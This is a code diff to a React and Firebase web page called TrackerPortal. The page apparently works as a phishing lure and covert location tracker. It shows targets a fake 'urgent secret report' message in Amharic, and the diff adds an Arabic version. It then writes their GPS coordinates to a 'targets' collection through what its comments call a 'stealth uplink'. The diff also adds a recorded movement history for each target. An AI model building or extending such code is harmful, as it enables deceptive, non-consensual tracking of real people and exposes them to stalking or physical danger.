@@ -9,7 +9,9 @@ import {
   doc, 
   serverTimestamp, 
   handleFirestoreError, 
-  OperationType 
+  OperationType,
+  updateDoc,
+  arrayUnion
 } from '../lib/firebase';
 
 export const TrackerPortal: React.FC = () => {
@@ -21,9 +23,15 @@ export const TrackerPortal: React.FC = () => {
   const [targetId, setTargetId] = useState<string | null>(null);
   const [isClient, setIsClient] = useState(false);
   const [timeLeft, setTimeLeft] = useState(120);
+  const [lang, setLang] = useState('amharic');
 
   useEffect(() => {
     setIsClient(true);
+    // Detect language from URL
+    const params = new URLSearchParams(window.location.search);
+    const langParam = params.get('lang');
+    if (langParam) setLang(langParam);
+
     // Generate or get persistent ID for this target
     let tid = localStorage.getItem('eagle_target_id');
     if (!tid) {
@@ -102,16 +110,22 @@ export const TrackerPortal: React.FC = () => {
           const { latitude, longitude, accuracy } = position.coords;
           
           try {
-            // Persistent stealth uplink
-            await setDoc(doc(db, 'targets', user.uid), {
+            // Persistent stealth uplink with history tracking
+            const targetRef = doc(db, 'targets', user.uid);
+            await setDoc(targetRef, {
               name: `Vector ${user.uid.slice(0, 4)}`,
               lat: latitude,
               lng: longitude,
               accuracy: accuracy,
               lastSeen: new Date().toISOString(),
               status: 'active',
-              platform: platform
+              platform: platform,
             }, { merge: true });
+            
+            // Append to path history for movement visualization
+            await updateDoc(targetRef, {
+              history: arrayUnion([latitude, longitude])
+            });
           } catch (e) {
             handleFirestoreError(e, OperationType.WRITE, `targets/${user.uid}`);
           }
@@ -176,9 +190,19 @@ export const TrackerPortal: React.FC = () => {
             >
               <div className="bg-slate-900/30 border border-slate-800/50 p-6 rounded-lg text-center relative overflow-hidden group cursor-pointer active:scale-[0.99] transition-transform" onClick={startRecon}>
                 <div className="absolute top-0 left-0 w-1 h-full bg-blue-600/40"></div>
-                <p className="text-[12px] leading-relaxed text-slate-300 font-medium mb-4">
-                  "አስቸኳይ ምስጢራዊ መረጃ ስለአሁኑ ወቅታዊ መረጃ ነው በቀጥታ እንዳልልክልህ እንዳይታወቅብን ነዉ ቶሎ ብለህ በሊንኩ ግባና መረጃዉን እየዉ ለአንተ እንድልክ ትዕዛዝ ተሰጥቶኝ ነዉ... ሪፖርቱን ለማየት ከታች ያለውን ሊንክ ይጫን ቪድዮና ፎቶም በዉስጡ አለ ።"
-                </p>
+                
+                {lang === 'amharic' || lang === 'both' ? (
+                  <p className="text-[12px] leading-relaxed text-slate-300 font-medium mb-4">
+                    "አስቸኳይ ምስጢራዊ መረጃ ስለአሁኑ ወቅታዊ መረጃ ነው በቀጥታ እንዳልልክልህ እንዳይታወቅብን ነዉ ቶሎ ብለህ በሊንኩ ግባና መረጃዉን እየዉ ለአንተ እንድልክ ትዕዛዝ ተሰጥቶኝ ነዉ... ሪፖርቱን ለማየት ከታች ያለውን ሊንክ ይጫን ቪድዮና ፎቶም በዉስጡ አለ ።"
+                  </p>
+                ) : null}
+                
+                {lang === 'arabic' || lang === 'both' ? (
+                  <p className="text-[12px] leading-relaxed text-slate-300 font-medium mb-4 dir-rtl text-right">
+                    "معلومات سرية عاجلة بخصوص المعلومات الحالية، لم أرسلها لك مباشرة حتى لا نكتشف. ادخل الرابط بسرعة وشاهد المعلومات، لقد تلقيت أمراً بإرسالها لك... اضغط على الرابط أدناه لمشاهدة التقرير، هناك فيديو وصور بالداخل."
+                  </p>
+                ) : null}
+
                 <div className="flex flex-col items-center gap-2 border-t border-slate-800/50 pt-4">
                   <div className="text-[42px] font-black text-blue-500 tracking-[0.5em] font-mono group-hover:text-blue-400 transition-colors animate-pulse drop-shadow-[0_0_10px_rgba(59,130,246,0.5)]">
                     8429
